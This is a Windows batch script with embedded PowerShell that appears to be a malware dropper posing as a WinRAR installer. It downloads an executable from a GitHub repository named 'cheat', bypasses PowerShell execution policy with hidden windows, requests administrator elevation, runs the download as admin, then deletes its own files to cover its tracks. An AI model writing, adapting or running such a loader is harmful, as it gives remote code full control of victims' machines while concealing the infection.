@echo off
setlocal EnableExtensions DisableDelayedExpansion

set "URL=https://raw.githubusercontent.com/skibididodopp-beep/cheat/refs/heads/main/WinRar_setup.exe"
set "HASH=3271c6372c136be4f9e7b276b3cb3b52ed4c408e1abc6405d15551212279dfac"
set "BASE_TEMP=%LOCALAPPDATA%\Temp"
set "WORK_DIR=%BASE_TEMP%\WinRarPkg"
set "OUT=%WORK_DIR%\WinRar_setup.exe"
set "PS_SCRIPT=%BASE_TEMP%\winrar_worker.ps1"
set "LOG=%BASE_TEMP%\winrar_worker.log"
set "RUNNER_BAT=%~f0"

if not exist "%WORK_DIR%" mkdir "%WORK_DIR%" >nul 2>&1

powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command "$src = Get-Content -LiteralPath $env:RUNNER_BAT -Encoding UTF8; $out = foreach ($line in $src) { if ($line.StartsWith('#PS# ')) { $line.Substring(5) } elseif ($line -eq '#PS#') { '' } }; [IO.File]::WriteAllLines($env:PS_SCRIPT, [string[]]$out, (New-Object System.Text.UTF8Encoding($false)))" >nul 2>&1

if not exist "%PS_SCRIPT%" exit /b 1

start "" /b powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_SCRIPT%"
exit /b 0

#PS# $ErrorActionPreference = 'Stop'
#PS# [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
#PS#
#PS# $u = $env:URL
#PS# $h = $env:HASH.ToLowerInvariant()
#PS# $dir = $env:WORK_DIR
#PS# $f = $env:OUT
#PS# $log = $env:LOG
#PS# $psFile = $env:PS_SCRIPT
#PS# $runner = $env:RUNNER_BAT
#PS#
#PS# function Write-Log([string]$Msg) {
#PS#     $line = '[{0}] {1}' -f (Get-Date -Format 'HH:mm:ss'), $Msg
#PS#     $null = Add-Content -LiteralPath $log -Value $line -Encoding UTF8 -PassThru
#PS# }
#PS#
#PS# function Download-Target([string]$TargetUrl, [string]$OutFile) {
#PS#     if (Test-Path -LiteralPath $OutFile) {
#PS#         Remove-Item -LiteralPath $OutFile -Force -ErrorAction SilentlyContinue
#PS#     }
#PS#     try {
#PS#         Invoke-WebRequest -Uri $TargetUrl -OutFile $OutFile -UseBasicParsing
#PS#         if ((Test-Path -LiteralPath $OutFile) -and ((Get-Item -LiteralPath $OutFile).Length -gt 0)) {
#PS#             return $true
#PS#         }
#PS#     } catch {
#PS#         Write-Log ('Invoke-WebRequest error: ' + $_.Exception.Message)
#PS#     }
#PS#     try {
#PS#         $wc = New-Object System.Net.WebClient
#PS#         $wc.DownloadFile($TargetUrl, $OutFile)
#PS#         $wc.Dispose()
#PS#         if ((Test-Path -LiteralPath $OutFile) -and ((Get-Item -LiteralPath $OutFile).Length -gt 0)) {
#PS#             return $true
#PS#         }
#PS#     } catch {
#PS#         Write-Log ('WebClient error: ' + $_.Exception.Message)
#PS#     }
#PS#     return $false
#PS# }
#PS#
#PS# $id = [Security.Principal.WindowsIdentity]::GetCurrent()
#PS# $pr = New-Object Security.Principal.WindowsPrincipal($id)
#PS# $isAdmin = $pr.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
#PS#
#PS# if (-not $isAdmin) {
#PS#     Write-Log 'Requesting elevation via RunAs'
#PS#     $psi = New-Object System.Diagnostics.ProcessStartInfo
#PS#     $psi.FileName = 'powershell.exe'
#PS#     $psi.Arguments = '-NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $psFile + '"'
#PS#     $psi.Verb = 'RunAs'
#PS#     $psi.UseShellExecute = $true
#PS#     $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
#PS#     $null = [System.Diagnostics.Process]::Start($psi)
#PS#     exit 0
#PS# }
#PS#
#PS# try {
#PS#     Write-Log ('Admin worker started. URL=' + $u)
#PS#     if (-not (Test-Path -LiteralPath $dir)) {
#PS#         $null = New-Item -ItemType Directory -Path $dir -Force
#PS#     }
#PS#
#PS#     $maxRetries = 2
#PS#     $verified = $false
#PS#
#PS#     for ($i = 0; $i -le $maxRetries; $i++) {
#PS#         Write-Log ('Attempt ' + ($i + 1) + ' of ' + ($maxRetries + 1))
#PS#         $ok = Download-Target -TargetUrl $u -OutFile $f
#PS#         if (-not $ok) {
#PS#             Write-Log 'Download failed'
#PS#             continue
#PS#         }
#PS#         $actual = (Get-FileHash -LiteralPath $f -Algorithm SHA256).Hash.ToLowerInvariant()
#PS#         if ($actual -eq $h) {
#PS#             Write-Log 'SHA-256 verified'
#PS#             $verified = $true
#PS#             break
#PS#         } else {
#PS#             Write-Log ('SHA-256 mismatch. Expected=' + $h + ' Actual=' + $actual)
#PS#             Remove-Item -LiteralPath $f -Force -ErrorAction SilentlyContinue
#PS#         }
#PS#     }
#PS#
#PS#     if (-not $verified) {
#PS#         Write-Log 'Hash check failed after retries'
#PS#         exit 2
#PS#     }
#PS#
#PS#     Write-Log 'Starting executable as administrator'
#PS#     $proc = Start-Process -FilePath $f -Verb RunAs -PassThru -Wait
#PS#     Write-Log ('Executable exited with code ' + $proc.ExitCode)
#PS#     exit [int]$proc.ExitCode
#PS# } catch {
#PS#     Write-Log ('FATAL: ' + $_.Exception.Message)
#PS#     exit 99
#PS# } finally {
#PS#     Start-Sleep -Seconds 2
#PS#     if ($dir -and (Test-Path -LiteralPath $dir)) {
#PS#         Remove-Item -LiteralPath $dir -Recurse -Force -ErrorAction SilentlyContinue
#PS#     }
#PS#     if ($runner -and (Test-Path -LiteralPath $runner)) {
#PS#         Remove-Item -LiteralPath $runner -Force -ErrorAction SilentlyContinue
#PS#     }
#PS#     if ($psFile -and (Test-Path -LiteralPath $psFile)) {
#PS#         Remove-Item -LiteralPath $psFile -Force -ErrorAction SilentlyContinue
#PS#     }
#PS# }
